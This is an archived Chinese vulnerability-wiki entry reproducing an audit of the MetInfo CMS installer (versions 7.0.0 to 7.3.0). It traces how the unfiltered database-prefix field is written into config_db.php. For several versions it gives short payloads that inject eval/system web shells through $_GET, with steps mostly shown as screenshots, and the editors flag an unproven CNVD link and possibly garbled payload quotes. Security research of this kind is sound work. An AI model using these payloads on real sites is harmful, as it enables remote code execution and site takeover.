---
cnvd: "CNVD-2021-01930"
source: "MrWQ/vulnerability-paper"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "米拓建站系统 1day 审计与利用"
product: "MetInfo 安装流程配置写入 CNVD-2021-01930关联"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；必须安装流程可达且安装锁/配置可写，正文未证明已安装站点能绕过锁或认证；末尾推荐SQLi非本文漏洞，保留多版本分析并去招稿/靶场广告"
side_effects: "安装页面db_prefix到config_db.php写入链明确但关键源码全截图；范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；CNVD被写为进一步深入关联，没有公告证明该编号就是本配置写入"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E7%B1%B3%E6%8B%93%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%201day%20%E5%AE%A1%E8%AE%A1%E4%B8%8E%E5%88%A9%E7%94%A8.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/n9g4zZs5a1H8qTbbwFBe5Q"
id: "vw-e0813e7b33dc5a562222c5e3"
entity_id: "ve-e0813e7b33dc5a562222c5e3"
schema_version: "1"
---

# 米拓建站系统 1day 审计与利用

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：MetInfo 安装流程配置写入 CNVD-2021-01930关联
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；必须安装流程可达且安装锁/配置可写，正文未证明已安装站点能绕过锁或认证；末尾推荐SQLi非本文漏洞，保留多版本分析并去招稿/靶场广告
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 安装页面db_prefix到config_db.php写入链明确但关键源码全截图
2. 范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁
3. 必须安装流程可达且安装锁/配置可写，正文未证明已安装站点能绕过锁或认证
4. CNVD被写为进一步深入关联，没有公告证明该编号就是本配置写入
5. payload起始中文引号可能转码损坏，原始HTTP和生成配置内容缺文本
6. 末尾推荐SQLi非本文漏洞，保留多版本分析并去招稿/靶场广告

### 操作风险

安装页面db_prefix到config_db.php写入链明确但关键源码全截图；范围7.3.0-7.0.0逆序应规范，展示四版本不自动覆盖所有补丁；CNVD被写为进一步深入关联，没有公告证明该编号就是本配置写入

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/n9g4zZs5a1H8qTbbwFBe5Q>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/n9g4zZs5a1H8qTbbwFBe5Q)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LebHs2DGyKAEgZupcIbXWAgnQlIoLerewyAX3c3bLLg0iaTpJeUuGKrSWsicRvLMXwCIbhkUC8GqGibg/640?wx_fmt=gif)

**原创稿件征集**

  

邮箱：edu@antvsion.com

QQ：3200599554

黑客与极客相关，互联网安全领域里

的热点话题

漏洞、技术相关的调查或分析

稿件通过并发布还能收获

200-800 元不等的稿酬  

**Metinfo****cms 命令执行**

**前话：**

米拓企业建站系统是一款由长沙某公司自主研发的免费开源企业级 CMS，该系统拥有大量的用户使用，及对该款 cms 进行审计，如果利用 CNVD-2021-01930 进行进一步深入，其危害的严重性可想而知。

**审计过程：**

1.Index：拿到源码先看根目录的 index.php 看看都包含（加载）了什么文件。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7Isj3zI1zicYobcp0xWSOqxicjvfNCoSMicgkmdrk7XQ67eNF2ZwAbceEw/640?wx_fmt=png)  

2. 关键词：在 / app/system/entrance.php 看到了配置文件的定义，全局搜索这’PATH_CONFIG‘参数。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l74VjtmAlRb8qpc2BAa4aWbfvZ6ia8m70Oz9Qu60KG9GGUZI2qydmdUaw/640?wx_fmt=png)  

全局搜索并找到 install/index.php 文件下有这个参数，点击跟进查看。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l72icsoAK80755sKia9EYgXW156IqQib4ibZgJWsy9E22iazWPqzHSbQ5ic6uw/640?wx_fmt=png)  

在这个文件的 219 行有个是接收 db 数据库参数的方法。

官方说明 “$_M” 数组：  
https://doc.metinfo.cn/dev/basics/basics75.html

这里是接收 from 数据的 db_prefix 参数。也就是 “数据表前缀” 内容的值。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7NERtDD9ZldMDqAHyGJRGJ5NqUSRjE04Hibib9V09esIvZQwHnAsVEOBQ/640?wx_fmt=png)

往下发现是直接写入 tableper 然后赋值给 config 变量。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l79NmhAO9H2Tq6hvSLURarIb28CvicJYiaZqJ644vMarEkQSoR8u7mDuMQ/640?wx_fmt=png)

并在 264 行 fopen 打开 /config/config_db.php 进行没有安全过滤的字节流（fputs）方式的写入。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7AE4icjFx1YKOKYXUIqLia9A7ss5Q6jM8Mia60EHl2GYRibYo1UGrqwZ3ibA/640?wx_fmt=png)

影响版本：7.3.0- 7.0.0

一、进行 7.3.0 安装步骤，访问 http://127.0.0.1/install/index.php

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7bAK8BWxvfnibhy0eN4k7sA4dMw2dFOF9g7lqfVm4x6iaQKfUJHVF4MDQ/640?wx_fmt=png)  

二、选中传统安装继续下一步

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7KYbDNI2glZGQIJ3cHz2DvoRG9wts9sxZf1HUThkyKiawzJGCQLTty8g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7SCz4qGia7loK0UTMvYCoOInsUHZKLgRBZicvQkrMy55xl1RRsGcBjuhQ/640?wx_fmt=png)

三、数据库信息进行写 shell

代码执行 Payload："*/@eval($_GET['1']);/*

命令执行 Payload："*/@system($_GET['1']);/*

代码执行：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7s6kR2yAuRauyibibJoryIBIDpibqS5MLw4SdEumfc4S3ljlhedIibCNibug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7pSC56S7hJsJic5yYXFIy8EpZtgkpCfibECz3V9aWExWyZjfIkoLoJMiaw/640?wx_fmt=png)  

点击保存进行下一步验证，出现这报错信息，可以查看 config\config_db.php 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7dW7CZSYs0pGA4Xd7RVALCW45picMzUwqvAvGzmKic8C3jicGQoC3VvKGg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7lShDp0kYmYB4RWE6UfUtxyN2vyfy5iawyT4GG7mVvd3dJyribF3bq4Mw/640?wx_fmt=png)成功写入

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7zcCLW2dZUezfWZCR5HNUs1ueyJ85sownJatXISicHgQ9icGQibNLHw9JA/640?wx_fmt=png)

命令执行：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7wibOJDEicLexBCiay2KeZO6VVrNtEaicFZ0JicrpNzYrsLG9MPFV8ic6nGKQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7dW7CZSYs0pGA4Xd7RVALCW45picMzUwqvAvGzmKic8C3jicGQoC3VvKGg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7wmkMPRFXjTYWeAnWREBlZJtKXrz15Ub9qGtNj2zPwbs1cyddUibbXzQ/640?wx_fmt=png)

7.0.0 版本：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7wicVdG0b3nYFFNwoUOurANHWaDsXwTicgW8eEMibIkp3WHOibWTkatwy6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7kiadLucNlkCAAF0aEC8OG1EAp2SVBVDvXpuFz5vIrYIiayx7w6bCRfOQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l721lCu72BOBibe97Daia3SaMQXKF8ugIiabOAcy5WoYgiaDichwE1mD4B6ng/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7F18gjNM3qTxxibnpMTEWicCZt6y4uGpibEcDRw8Q4MpricYYJPuSlCWqGQ/640?wx_fmt=png)7.1.0 版本：

Payload："*/@eval($_GET['1']);@system($_GET['2']);/*

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l78mfcPnJHpEibxrWnia6w1rpI2bia61A3WOJN3xdHzr9S34FJtJgQffAIg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7qBTtxlbyCezRISxP1bgolnibfnibnyfzlppL1lom27AdqgUXYEp25SXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l74Z7Bu7uBKfLic4q3eQVUeaKNlKic8X02zIC9VbGREEtEabWERudZefcA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l709GDRV3ArEsOB6IvAlvjyPKES1YLBIicK3qoHnFapOwc65reeynM1Aw/640?wx_fmt=png)7.2.0 版本：

Payload："*/@eval($_GET['1']);@system($_GET['2']);/*

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7BN7vSMuRicB65fre2rIyEE9I03WjN3kaiceobZjibuVS7dSUArAhvMQSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7hLiaeAHshqhwD8ibicWy8KVgjKZlnFaN6BzqOd8SHzfAiaJNqQdj6QiaIbQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7FYn8z5TeyG7s6bfibxibfdoOucoxUia3Xmk4F2yGictCQ46iaEuPyfl8vNA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcLCcsNxcNEmQeAVbBNic8l7XjyOnsVbWfbyoV7WrEKpSvrut0z5dFHztx8MRA81TRNPNtoOibaNvzw/640?wx_fmt=png)

推荐实操：MetInfo SQL 注入   

https://www.hetianlab.com/expc.do?ec=ECID269f-6dc2-4412-bbad-a27109b207cf&pk_campaign=weixin-wemedia#stu    

通过该实验掌握 MetInfo SQL 注入漏洞的原因和利用方法，以及如何修复该漏洞。  

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LfbzQb75ZqoK2T2YO9XTQYD0aDUibvcxdbLRqzCwlkYcn0HppvXpZuenRzjX8ibhzcibJJge9Bw9xc8A/640?wx_fmt=gif)

戳

  

“阅读原文”

  

  

体验免费靶场！

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
